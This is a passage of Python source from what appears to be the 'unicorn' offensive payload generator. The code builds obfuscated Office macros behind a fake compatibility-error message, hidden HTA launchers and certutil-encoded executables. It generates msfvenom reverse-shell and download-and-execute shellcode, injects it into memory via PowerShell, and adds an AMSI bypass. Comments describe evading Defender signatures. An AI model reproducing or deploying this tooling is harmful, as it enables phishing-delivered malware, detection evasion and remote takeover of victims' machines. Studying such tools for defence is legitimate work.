letter = '\"' + letter.rstrip() + '\" & '\n        list = list + letter\n\n    full_exe = list[:-2]\n    ps_only = full_exe.split(\".\")[0][:-4]\n\n    wscript = \"WScript\"\n    shell = \"Shell\"\n    list2 = \"\"\n    for letter in wscript:\n        letter = '\"' + letter.rstrip() + '\" & '\n        list2 = list2 + letter\n\n    full_wscript = list2[:-2]\n\n    list3 = \"\"\n    for letter in shell:\n        letter = '\"' + letter.rstrip() + '\" & '\n        list3 = list3 + letter\n\n    full_shell = list3[:-2]\n\n    return full_exe + \",\" + ps_only + \",\" + full_wscript + \",\" + full_shell\n\n# generate full macro\ndef generate_macro(full_attack, line_length=50):\n\n    # we don't want to have AMSI_BYPASS messing with the payload itself so we strip the AMSI Bypass code to run our full powershell payload\n    if (\"# actual unicorn payload\") in full_attack:\n        full_attack = full_attack.split(\"actual unicorn payload\")[1].split(\"\\n\")[1].rstrip()\n\n    # randomize macro name\n    macro_rand = generate_random_string(5, 10)\n    # start of the macro\n    macro_str = (\"Sub Auto_Open()\\nDim {0}\\n{1} = \".format(macro_rand, macro_rand))\n    if line_length is None:\n        line_length_int = 50\n    else:\n        line_length_int = int(line_length)\n    powershell_command_list = split_str(full_attack, line_length_int)\n\n    counter = 0\n    for line in powershell_command_list:\n        if counter == 0:\n            macro_str += \" \\\"\" + line + \"\\\"\\n\"\n        if counter >= 1:\n            macro_str += macro_rand + \" = \" + macro_rand + \" + \\\"\" + line + \"\\\"\\n\"\n\n        counter = counter + 1\n\n    # strip un-needed\n    macro_str = macro_str.replace(r's\\\"\\\"v', \"sv\").replace(r'e\\\"\\\"c', 'ec').replace(r'\\\"\\\"v', 'v').replace(r'g\\\"\\\"v', 'gv')\n\n    macro_str = macro_str.replace('powershell /w 1 /C \"', r' /w 1 /C \"\"')\n    #macro_str = macro_str.replace('/w 1', \"\") # no longer needed\n    macro_str = macro_str.replace(\"')\", \"')\\\"\")\n\n    # obfsucate the hell out of Shell and PowerShell\n    long_string = scramble_stuff().split(\",\")\n    # full powershell.exe\n    ps_long = long_string[0]\n    # ps abbreviated\n    ps_short = long_string[1][1:]\n    # wscript\n    wscript = long_string[2]\n    # shell\n    shell = long_string[3]\n\n    macro_str = macro_str.replace('powershell /w 1', ps_short + ' & \" /w 1')\n    macro_str = macro_str.replace(';powershell', ';\" & \"' + ps_short + ' & \"')\n\n    # randomized variables\n    function1 = generate_random_string(5, 15)\n    function2 = generate_random_string(5, 15)\n    function3 = generate_random_string(5, 15)\n    function4 = generate_random_string(5, 15)\n    function5 = generate_random_string(5, 15)\n    function6 = generate_random_string(5, 15)\n\n    # our message we present to the end user - can change this to whatever you want\n    macro_message = (\"This application appears to have been made with an older version of the Microsoft Office product suite. Please have the author save this document to a newer and supported format. [Error Code: -219]\")\n\n    # title bar on top what it states there, you can also change this to whatever you want\n    subject_message = (\"Microsoft Office (Compatibility Mode)\")\n \n    # our final product of obfsucated code - note that defender made a signature to look for WScript.Run with a compacted string with a \"False\" terminal window. Just needed to split it out into two lines :P\n    macro_str += (\"\"\"\\n\\nDim {0}\\n{1} = {2}\\nDim {3}\\n{4} = {5}\\nDim {6}\\n{7} = {8} & \".\" & {9}\\nDim {10}\\nDim {11}\\nSet {12} = VBA.CreateObject({13})\\nDim waitOnReturn As Boolean: waitOnReturn = False\\nDim windowStyle As Integer: windowStyle = 0\\nDim {14}\\n{14} = {15} & \" \"\\n{17}.Run {18} & {19}, windowStyle, waitOnReturn\\n\\nDim title As String\\ntitle = \"{21}\"\\nDim msg As String\\nDim intResponse As Integer\\nmsg = \"{20}\"\\nintResponse = MsgBox(msg, 16, title)\\nApplication.Quit\\nEnd Sub\"\"\".format(function1, function1, shell, function2, function2, wscript, function3, function3, function2, function1, function4, function5, function4, function3, function6, ps_long, function5, function4, function6,macro_rand,macro_message,subject_message))\n\n    # strip and fix issues\n    macro_str = macro_str.replace(\"''\", \"\")\n\n    return macro_str\n\n\n# generate Matthew Graeber's (Matt rocks) attack for binary to cert format #KeepMattHappy\n# - https://gist.github.com/mattifestation/47f9e8a431f96a266522\ndef gen_cert_attack(filename):\n    if os.path.isfile(filename):\n        # make sure the directory is made\n        if not os.path.isdir(\"decode_attack\"):\n            os.makedirs(\"decode_attack\")\n\n        # remove old files here\n        if os.path.isfile(\"decode_attack/encoded_attack.crt\"):\n            os.remove(\"decode_attack/encoded_attack.crt\")\n\n        print(\"[*] Importing in binary file to base64 encode it for certutil prep.\")\n        data = open(filename, \"rb\").read()\n        data = base64.b64encode(data)\n        print(\"[*] Writing out the file to decode_attack/encoded_attack.crt\")\n        write_file(\"decode_attack/encoded_attack.crt\",\n                   \"-----BEGIN CERTIFICATE-----\\n{0}\\n-----END CERTIFICATE-----\".format(data))\n        print(\"[*] Filewrite complete, writing out decode string for you..\")\n        write_file(\"decode_attack/decode_command.bat\",\n                   \"certutil -decode encoded_attack.crt encoded.exe\")\n        print(\"[*] Exported attack under decode_attack/\")\n        print(\"[*] There are two files, encoded_attack.crt contains your encoded data\")\n        print(\"[*] The second file, decode_command.bat will decode the cert to an executable.\")\n    else:\n        print(\"[!] File was not found. Exiting the unicorn attack.\")\n        sys.exit()\n\n# Generate HTA launchers and index\ndef gen_hta_attack(command):\n    # HTA code here\n\n    command = command.replace(\"'\", \"\\\\'\")\n    # generate random variable names for vba\n    hta_rand = generate_random_string(10, 30)\n\n    # split up so we arent calling shell command for cmd.exe\n    shell_split1 = generate_random_string(10, 100)\n    shell_split2 = generate_random_string(10, 100)\n    shell_split3 = generate_random_string(10, 100)\n    shell_split4 = generate_random_string(10, 100)\n    shell_split5 = generate_random_string(10, 100)\n\n    # 'powershell /w 1 /C \"s\\'\\'v EZE -;s\\'\\'v KRA e\\'\\'c;s\\'\\'v gvH ((g\\'\\'v EZE).value.toString()+(g\\'\\'v KRA).value.toString());powershell (g\n    ps_split1 = generate_random_string(10, 100)\n    ps_split2 = generate_random_string(10, 100)\n    ps_split3 = generate_random_string(10, 100)\n    ps_split4 = generate_random_string(10, 100)\n\n    main1 = (\"\"\"<script>\\n{0} = \"WS\";\\n{1} = \"crip\";\\n{2} = \"t.Sh\";\\n{3} = \"ell\";\\n{4} = ({0} + {1} + {2} + {3});\\n{6} = \"pow\";\\n{7} = \"ersh\";\\n{8} = \"ell\";\\n{9} = ({6} + {7} + {8});\\n{5}=new ActiveXObject({4});\\n\"\"\".format(shell_split1, shell_split2, shell_split3, shell_split4, shell_split5, hta_rand, ps_split1, ps_split2, ps_split3, ps_split4))\n    main2 = (\"\"\"{0}.run(\"\"\".format(hta_rand))\n    main4 = (\"\"\"{0}', 0);window.close();\\n</script>\"\"\".format(command)).replace(\"powershell\", \"{0} + '\".format(ps_split4)).replace(\";{0}\".format(ps_split4), \";' + {0}\".format(ps_split4))\n    html_code = (\"\"\"<iframe id=\"frame\" src=\"Launcher.hta\" application=\"yes\" width=0 height=0 style=\"hidden\" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>\"\"\")\n\n    # remote old directory\n    if os.path.isdir(\"hta_attack\"):\n        shutil.rmtree(\"hta_attack\") \n\n    os.makedirs(\"hta_attack\")\n\n    # write out index file\n    print(\"[*] Writing out index file to hta_attack/index.html\")\n    write_file(\"hta_attack/index.html\", html_code)\n\n    # write out Launcher.hta\n    print(\"[*] Writing malicious hta launcher hta_attack/Launcher.hta\")\n    write_file(\"hta_attack/Launcher.hta\", main1 + main2 + main4)\n\n\n# format metasploit shellcode\ndef format_metasploit(data):\n    # start to format this a bit to get it ready\n    repls = {';': '', ' ': '', '+': '', '\"': '', '\\n': '', 'buf=': '', 'Found 0 compatible encoders': '','unsignedcharbuf[]=': ''}\n    #data = data.decode()\n    data = reduce(lambda a, kv: a.replace(*kv),iter(repls.items()), data).rstrip()\n    if len(data) < 1:\n        print(\"[!] Critical: It does not appear that your shellcode is formatted properly. Shellcode should be in a 0x00,0x01 format or a Metasploit format.\")\n        print(\"[!] Example: msfvenom -p LHOST=192.168.5.5 LPORT=443 -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -f c\")\n        print(\"[!] Also ensure your syntax for unicorn is correct. Missing IP address, port, etc. etc. will cause this error.\")\n        print(\"Exiting....\")\n        sys.exit()\n\n    return data\n\n\n# generate the actual shellcode through msf\ndef generate_shellcode(payload, ipaddr, port):\n    print(\"[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...\")\n    port = port.replace(\"LPORT=\", \"\")\n\n    # if we are using traditional payloads and not download_exec\n    if not \"exe=\" in ipaddr:\n        ipaddr = \"LHOST={0}\".format(ipaddr)\n        port = \"LPORT={0}\".format(port)\n\n    # if download_exec is being used\n    if \"url=\" in ipaddr:\n        # shellcode modified from https://www.exploit-db.com/exploits/24318/ - tested on windows xp, windows 7, windows 10, server 2008, server 2012\n        shellcode = (\"\\\\x33\\\\xC9\\\\x64\\\\x8B\\\\x41\\\\x30\\\\x8B\\\\x40\\\\x0C\\\\x8B\"\n                     \"\\\\x70\\\\x14\\\\xAD\\\\x96\\\\xAD\\\\x8B\\\\x58\\\\x10\\\\x8B\\\\x53\"\n                     \"\\\\x3C\\\\x03\\\\xD3\\\\x8B\\\\x52\\\\x78\\\\x03\\\\xD3\\\\x8B\\\\x72\"\n                     \"\\\\x20\\\\x03\\\\xF3\\\\x33\\\\xC9\\\\x41\\\\xAD\\\\x03\\\\xC3\\\\x81\"\n                     \"\\\\x38\\\\x47\\\\x65\\\\x74\\\\x50\\\\x75\\\\xF4\\\\x81\\\\x78\\\\x04\"\n                     \"\\\\x72\\\\x6F\\\\x63\\\\x41\\\\x75\\\\xEB\\\\x81\\\\x78\\\\x08\\\\x64\"\n                     \"\\\\x64\\\\x72\\\\x65\\\\x75\\\\xE2\\\\x8B\\\\x72\\\\x24\\\\x03\\\\xF3\"\n                     \"\\\\x66\\\\x8B\\\\x0C\\\\x4E\\\\x49\\\\x8B\\\\x72\\\\x1C\\\\x03\\\\xF3\"\n                     \"\\\\x8B\\\\x14\\\\x8E\\\\x03\\\\xD3\\\\x33\\\\xC9\\\\x51\\\\x68\\\\x2E\"\n                     \"\\\\x65\\\\x78\\\\x65\\\\x68\\\\x64\\\\x65\\\\x61\\\\x64\\\\x53\\\\x52\"\n                     \"\\\\x51\\\\x68\\\\x61\\\\x72\\\\x79\\\\x41\\\\x68\\\\x4C\\\\x69\\\\x62\"\n                     \"\\\\x72\\\\x68\\\\x4C\\\\x6F\\\\x61\\\\x64\\\\x54\\\\x53\\\\xFF\\\\xD2\"\n                     \"\\\\x83\\\\xC4\\\\x0C\\\\x59\\\\x50\\\\x51\\\\x66\\\\xB9\\\\x6C\\\\x6C\"\n                     \"\\\\x51\\\\x68\\\\x6F\\\\x6E\\\\x2E\\\\x64\\\\x68\\\\x75\\\\x72\\\\x6C\"\n                     \"\\\\x6D\\\\x54\\\\xFF\\\\xD0\\\\x83\\\\xC4\\\\x10\\\\x8B\\\\x54\\\\x24\"\n                     \"\\\\x04\\\\x33\\\\xC9\\\\x51\\\\x66\\\\xB9\\\\x65\\\\x41\\\\x51\\\\x33\"\n                     \"\\\\xC9\\\\x68\\\\x6F\\\\x46\\\\x69\\\\x6C\\\\x68\\\\x6F\\\\x61\\\\x64\"\n                     \"\\\\x54\\\\x68\\\\x6F\\\\x77\\\\x6E\\\\x6C\\\\x68\\\\x55\\\\x52\\\\x4C\"\n                     \"\\\\x44\\\\x54\\\\x50\\\\xFF\\\\xD2\\\\x33\\\\xC9\\\\x8D\\\\x54\\\\x24\"\n                     \"\\\\x24\\\\x51\\\\x51\\\\x52\\\\xEB\\\\x47\\\\x51\\\\xFF\\\\xD0\\\\x83\"\n                     \"\\\\xC4\\\\x1C\\\\x33\\\\xC9\\\\x5A\\\\x5B\\\\x53\\\\x52\\\\x51\\\\x68\"\n                     \"\\\\x78\\\\x65\\\\x63\\\\x61\\\\x88\\\\x4C\\\\x24\\\\x03\\\\x68\\\\x57\"\n                     \"\\\\x69\\\\x6E\\\\x45\\\\x54\\\\x53\\\\xFF\\\\xD2\\\\x6A\\\\x05\\\\x8D\"\n                     \"\\\\x4C\\\\x24\\\\x18\\\\x51\\\\xFF\\\\xD0\\\\x83\\\\xC4\\\\x0C\\\\x5A\"\n                     \"\\\\x5B\\\\x68\\\\x65\\\\x73\\\\x73\\\\x61\\\\x83\\\\x6C\\\\x24\\\\x03\"\n                     \"\\\\x61\\\\x68\\\\x50\\\\x72\\\\x6F\\\\x63\\\\x68\\\\x45\\\\x78\\\\x69\"\n                     \"\\\\x74\\\\x54\\\\x53\\\\xFF\\\\xD2\\\\xFF\\\\xD0\\\\xE8\\\\xB4\\\\xFF\"\n                     \"\\\\xFF\\\\xFF\\\\xURLHERE\\\\x00\")\n\n        url = ipaddr.replace(\"LHOST=\", \"\").replace(\"url=\", \"\")\n        url_patched = url_hexified(str.encode(url))\n        data = shellcode.replace(\"\\\\xURLHERE\", url_patched)\n\n    else:\n\n        # gen random number for length\n        #uri_length=generate_random_number(5,7)\n        proc = subprocess.Popen(\"msfvenom -p {0} {1} {2} -t 0 --platform windows -f c\".format(payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n        # AutoUnhookProcess=true AutoVerifySession=false AutoLoadStdapi=false  AutoSystemInfo=false --smallest\n        data = proc.communicate()[0]\n        # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.\n        data = data.decode(\"ascii\").replace('\"\\\\xfc', '\"', 1)\n        # bug output for metasploit, going to check here - if present then throw error message to end user\n        if \"no longer be in use\" in data or \"long,erbe,inus,e,so,tryd,elet,ingt\" in data:\n            print(\"[!] There was a problem generating the shellcode due to a Metasploit error. Please update Metasploit and re-run this.\")\n            sys.exit()\n\n    # return the metasploit data\n    return format_metasploit(data)\n\n# generate shellcode attack and replace hex\ndef gen_shellcode_attack(payload, ipaddr, port):\n    # regular payload generation stuff\n    # generate our shellcode first\n    if ipaddr != (\"cobaltstrike\"):\n        shellcode = generate_shellcode(payload, ipaddr, port).rstrip()\n        # sub in \\x for 0x\n        shellcode = re.sub(\"\\\\\\\\x\", \"0x\", shellcode)\n        # base counter\n        counter = 0\n        # count every four characters then trigger floater and write out data\n        floater = \"\"\n        # ultimate string\n        newdata = \"\"\n        for line in shellcode:\n            floater += line\n            counter += 1\n            if counter == 4:\n                newdata = newdata + floater + \",\"\n                floater = \"\"\n                counter = 0\n\n        # here's our shellcode prepped and ready to go\n        shellcode = newdata[:-1]\n\n        # if we aren't using download/exec\n        if not \"url=\" in ipaddr:\n            # write out rc file\n            write_file(\"unicorn.rc\", \"use multi/handler\\nset payload {0}\\nset LHOST {1}\\nset LPORT {2}\\nset ExitOnSession false\\nset AutoVerifySession false\\nset AutoSystemInfo false\\nset AutoLoadStdapi false\\nexploit -j\\n\".format(payload, ipaddr, port))\n\n    # switch variable to be shellcode for formatting\n    if ipaddr == \"cobaltstrike\": shellcode = payload\n\n    # added random vars before and after to change strings\n    # this is a hack job but it works in checking to see if there are any variable name conflicts. While random, can happen when using only 2 randomized characters for char lenght. \n    while True:\n        varcheck = (\"\")\n        reroll = False\n        var1 = \"$\" + generate_random_string(2, 2) # $1\n        varcheck = var1\n        var2 = \"$\" + generate_random_string(2, 2) # $c\n        if var2.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var2\n        var3 = \"$\" + generate_random_string(2, 2) # $2 - powershell\n        if var3.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var3\n        var4 = \"$\" + generate_random_string(2, 2) # $3\n        if var4.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var4\n        var5 = \"$\" + generate_random_string(2, 2) # $x\n        if var5.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var5\n        var6 = \"$\" + generate_random_string(2, 2) # $t\n        if var6.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var6\n        var7 = \"$\" + generate_random_string(2, 2) # $h\n        if var7.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var7\n        var8 = \"$\" + generate_random_string(2, 2) # $z\n        if var8.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var8\n        var9 = \"$\" + generate_random_string(2, 2) # $g\n        if var9.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var9\n        var10 = \"$\" + generate_random_string(2, 2) # $i\n        if var10.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var10\n        var11 = \"$\" + generate_random_string(2, 2) # $w\n        if var11.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var11\n        var12 = (str(generate_random_number(1001,1010)))\n        if var12.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var12\n        var13 = \"$\" + generate_random_string(2, 2) # $4 - Windows\n        if var13.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var13\n        var14 = generate_random_string(3, 3) # $allocreplace\n        if var14.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var14\n        tempvar_withoutdollar = generate_random_string(3, 3) # $tempvar\n        var15 = \"$\" + tempvar_withoutdollar\n        if var15.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var15\n\n        var16 = generate_random_string(3,3) # $createthread\n        if var16.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var16\n\n\n        var17 = \"$\" + generate_random_string(3,3) # $yyyy\n        if var17.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var17\n\n        var18 = generate_random_string(3,3) # $Win32\n        if var18.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var18\n\n        var19 = generate_random_string(3,3) # $CreateThread\n        if var19.lower() in varcheck.lower():\n            reroll = True\n        varcheck = varcheck + var19\n\n        if reroll == True: print(\"[*] Great Scott!! There was a variable conflict. This happens. It's OK Marty. Rerolling variable names until we get a solid set to remove conflicting names.\")\n        if reroll == False: break\n\n    # generate random service name from win32 - defender was looking from name win32 + 0x00 length inside of byte array\n    randomize_service_name = generate_random_string(2,2)\n\n    # randomize kernel32.dll for fun\n    random_length = generate_random_number(1,12)\n\n    # random var name  \n    full_command = generate_random_string(2,2)\n\n    # randomize kernel32.dll and msvcrt.dll\n    kernel = mangle_word(\"kernel32.dll\")\n    msv = mangle_word(\"msvcrt.dll\")\n    Win32 = mangle_word(\"Win32Functions\")\n    true_mangle = mangle_word(\"True\")\n    # here we do a little magic to get around AMSI, no more cat and mouse game here by chunking of shellcode, it's not needed since Defender and AMSI is still signature driven primarily\n    random_symbols = ['!', '@', '#', '%', '^', '&', '*', '(', ')', '-', '+', '=', '{', '}', '|', '.', ':', ';', '<', '>', '?', '/']\n    random_symbols = ['}']\n    mangle_shellcode = (random.choice(random_symbols))\n\n    #mangle_shellcode = generate_random_string(1, 1).upper()\n    shellcode = shellcode.replace(\"0x\", mangle_shellcode)\n\n    # mangle 0x\n    randomized_byte_name = generate_random_string(3,4)\n\n    # randomize syswow64 var\n    syswow_var = generate_random_string(3,4)\n\n    # randomize noe xit\n    noexit = generate_random_string(3,4)\n\n    truevalue = generate_random_string(3,4)\n\n    # syswow split for obfuscation\n    syswowsplit_1 = generate_random_string(3,4)\n    syswowsplit_2 = generate_random_string(3,4)\n\n    # one line shellcode injection with native x86 shellcode\n    powershell_code = (r'''$1111='$tttt=''[DllImport((\"%s\"))]public static extern IntPtr calloc(uint dwSize, uint amount);[DllImport(\"%s\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"%s\")]public static extern IntPtr VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %s);[DllImport(\"%s\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$zzzz=\"%s\";$wwww=Add-Type -pass -m $tttt -Name \"%s\" -names $Win32;$wwww=$wwww.replace(\"$Win32\", \"%s\");[byte[]]$zzzz = $zzzz.replace(\"SHELLCODE_STUB\",\"$randomized_byte_namex\").replace(\"$randomized_byte_name\", \"0\").Split(\",\");$gggg=0x$randstack;if ($zzzz.L -gt 0x$randstack){$gggg=$zzzz.L};$xxxx=$wwww::calloc(0x$randstack, 1);[UInt64]$tempvar = 0;for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::VirtualProtect($xxxx, 0x$randstack, 0x40, [Ref]$tempvar);$yyyy=[int]0x00;$wwww::CreateThread([int]0,$yyyy,$xxxx,0,0,1-1);';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222=\"powershell\";$4444=\"Windows\";$5555 = \"C:\\$4444\\$syswowsplit_1$syswowsplit_2\\$4444$2222\\v1.0\\$2222\";$5555 = $5555.replace(\"$syswowsplit_1\", \"sys\");$5555 = $5555.replace(\"$syswowsplit_2\", \"wow64\");$$truevalue = '%s';if([environment]::Is64BitOperatingSystem -eq '$$truevalue'){$2222= $5555};$fullcommand=\" $2222 $noexit $hhhh\";$fullcommand=$fullcommand.replace(\"$noexit\", \"-noexit -e\");iex $fullcommand''' % (msv,kernel,kernel,tempvar_withoutdollar,msv,shellcode,randomize_service_name,Win32,true_mangle)).replace(\"SHELLCODE_STUB\", mangle_shellcode)\n\n    # run it through a lame var replace\n    powershell_code = powershell_code.replace(\"$1111\", var1).replace(\"$cccc\", var2).replace(\n        \"$2222\", var3).replace(\"$3333\", var4).replace(\"$xxxx\", var5).replace(\"$tttt\", var6).replace(\n        \"$hhhh\", var7).replace(\"$zzzz\", var8).replace(\"$gggg\", var9).replace(\"$iiii\", var10).replace(\n        \"$wwww\", var11).replace(\"$randstack\", var12).replace(\"$4444\", var13).replace(\"$tempvar\", var15).replace(\n        \"$yyyy\", var17).replace(\"$Win32\", var18).replace(\"$randomized_byte_name\", randomized_byte_name).replace(\n        \"$fullcommand\", \"$\" + full_command).replace(\"$5555\", \"$\" + syswow_var).replace(\"$noexit\", noexit).replace(\n        \"$truevalue\", truevalue).replace(\"$syswowsplit_1\", syswowsplit_1).replace(\"$syswowsplit_2\", syswowsplit_2)\n\n    # if we have PRINT_DECODED=\"ON\" this will spit out the raw powershell code for you\n    if PRINT_DECODED.lower() == \"on\":\n        if AMSI_BYPASS.lower() == \"on\":\n            print(\"# AMSI BYPASS PAYLOAD BELOW\")\n            print(bypass_amsi())\n            print(\"\\n# ACTUAL UNICORN PAYLOAD BELOW\")\n        print(powershell_code)\n        print(\"\\n[*] Note that PRINT_DECODED inside unicorn.py was specified and printing the raw output for the PowerShell code. Turn this off to get the full unicorn code.\")\n        sys.exit()\n\n    return powershell_code\n\ndef gen_ps1_attack(ps1path):\n    if os.path.isfile(ps1path):\n        with open(ps1path, 'r') as scriptfile:\n            data = scriptfile.read()\n            return data\n    else:\n        print(\"[!] {0} does not exist. Please check your path\".format(ps1path))\n        sys.exit(1)\n\n\ndef format_payload(powershell_code, attack_type, attack_modifier, option):\n    gen_unicorn()\n    print(\"Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)\")\n    print(\"Twitter: @TrustedSec, @HackingDave\")\n    print(\"\\nHappy Magic Unicorns.\")\n\n    ran1 = generate_random_string(2, 3)\n    ran2 = generate_random_string(2, 3)\n    ran3 = generate_random_string(2, 3)\n    ran4 = generate_random_string(2, 3)\n\n    # format payload is for adding chunking to evade detection\n    avblah = base64.b64encode(powershell_code.encode('utf_16_le')) # kinder gentler dave variable name now\n    # here we mangle our encodedcommand by splitting it up in random chunks\n    avsux = randomint = random.randint(4000,5000)\n    avnotftw = [avblah[i: i + avsux] for i in range(0, len(avblah), avsux)]\n    haha_av = \"\"\n    counter = 0\n    for non_signature in avnotftw:\n        non_signature = (non_signature.rstrip())\n        if counter > 0: haha_av = haha_av + (\"+\")\n        if counter > 0: haha_av = haha_av + (\"'\") \n        surprise_surprise = non_signature.decode(\"ascii\") + (\"'\")\n        haha_av = haha_av + surprise_surprise #ThisShouldKeepMattHappy\n        haha_av = haha_av.replace(\"==\", \"'+'==\")\n        counter = 1\n    random_quotes = [\"''\", '\\\\\"\\\\\"' ]\n    mangle_quotes = (random.choice(random_quotes))\n\n    full_attack = '''powershell /w 1 /C \"sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + \")\" + '\"'\n\n    # if we want to use AMSI bypassing\n    if AMSI_BYPASS.lower() == \"on\": \n\n        random_symbols = ['!', '@', '#', '%', '^', '&', '*', '(', ')', '-', '+', '=', '{', '}', '|', '.', ':', ';', '<', '>', '?', '/']\n        random_symbols = ['}']\n        mangle_shellcode = (random.choice(random_symbols))\n        # here we mangle the code a bit to get around AMSI detections\n        kernel32 = mangle_word(\"kernel32\")\n        dll = mangle_word(\".dll\")\n        amsi = mangle_word(\"Amsi\")\n        scan = mangle_word(\"Scan\")\n        buffer = mangle_word(\"Buffer\")\n        one = \"$\" + generate_random_string(5,10)\n        two = \"$\" + generate_random_string(5,10)\n        three = \"$\" + generate_random_string(5,10)\n        four = \"$\" + generate_random_string(5,10)\n        five = generate_random_string(5,10)\n        six = generate_random_string(5,10)\n        amsi_string = (bypass_amsi()).replace(\"$kernel32\", kernel32).replace(\"$dll\", dll).replace(\"$amsi\", amsi).replace(\"$scan\", scan).replace(\"$buffer\", buffer).replace(\"$1111\", one).replace(\"$2222\", two).replace(\"$3333\", three).replace(\"$4444\", four)\n        amsi_string = (amsi_string).replace('%s = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);' % (four), '%s = (\"GOATxB8REPLACE, GOATxYAWN, GOATxGOATGOAT, GOATxGOAT7, GOATx8GOAT, GOATxC3\").replace(\"YAWN\", \"57\").replace(\"%s\", \"MOO\").replace(\"B8REPLACE\", \"B8\");%s = [Byte[]](%s).split(\",\");' % (four, mangle_shellcode, four, four)).replace(\"GOAT\", mangle_shellcode).replace(\"MOO\", \"0\").replace(\"YAWN\", five).replace(\"B8REPLACE\", six)\n        amsi_encoded = base64.b64encode(amsi_string.encode('utf_16_le')).decode('ascii')\n        # b8 horse\n        full_attack = '''# AMSI bypass code - run in same process as unicorn second stage\\npowershell /w 1 /C \"sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + amsi_encoded + \"')\" + '\"' + \"\\n\\n# actual unicorn payload\\n\" + full_attack\n\n    # powershell -w 1 -C \"powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA=\"  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak\n\n    # for cobalt strike\n    if attack_type == \"cs\":\n\n        # generate the hta attack vector with cobalt strike\n        if attack_modifier == \"hta\":\n            gen_hta_attack(full_attack)\n            cobalt_strike()\n            hta_help()\n            print(\"[*] Exported the hta attack vector to hta_attack/. This folder contains everything you need. Enjoy!\\n\")\n\n        elif attack_modifier == \"ms\":\n            ms_voodoo_stuff()\n            gen_hta_attack(full_attack)\n            cobalt_strike()\n            shutil.move(\"Standalone_NoASR.SettingContent-ms\", \"hta_attack/\")\n            settings_ms()\n            print(\"[*] Exported SettingContent-ms and all HTA attack stuff to hta_attack as Standalone_NoASR.SettingContent-ms, Launcher.hta, and index.html.\")\n            print(\"[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta\")\n            print(\"[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.\")\n\n        elif attack_modifier == \"macro\":\n            macro_attack = generate_macro(full_attack)\n            write_file(\"powershell_attack.txt\", macro_attack)\n            cobalt_strike()\n            macro_help()\n            print(\"[*] Exported the Cobalt Strike Unicorn Attack for Macros out to powershell_attack.txt. Enjoy!\\n\")\n\n        else:\n            write_file(\"powershell_attack.txt\", full_attack)\n            cobalt_strike()\n            print(\"[*] Exported the Cobalt Strike Unicorn Attack codebase out to powershell_attack.txt. Enjoy!\\n\")\n\n    # for custom shellcode\n    if attack_type == \"shellcode\":\n        if attack_modifier == \"hta\":\n            gen_hta_attack(full_attack)\n            custom_shellcode()\n            hta_help()\n            print(\"[*] Exported the hta attack vector to hta_attack/. This folder contains everything you need. Enjoy!\\n\")\n\n        elif attack_modifier == \"ms\":\n            ms_voodoo_stuff()\n            gen_hta_attack(full_attack)\n            custom_shellcode()\n            shutil.move(\"Standalone_NoASR.SettingContent-ms\", \"hta_attack/\")\n            settings_ms()\n            print(\"[*] Exported SettingContent-ms and all HTA attack stuff to hta_attack as Standalone_NoASR.SettingContent-ms, Launcher.hta, and index.html.\")\n            print(\"[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta\")\n            print(\"[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.\")\n\n        elif attack_modifier == \"macro\":\n            macro_attack = generate_macro(full_attack)\n            write_file(\"powershell_attack.txt\", macro_attack)\n            custom_shellcode()\n            macro_help()\n\n        else:\n   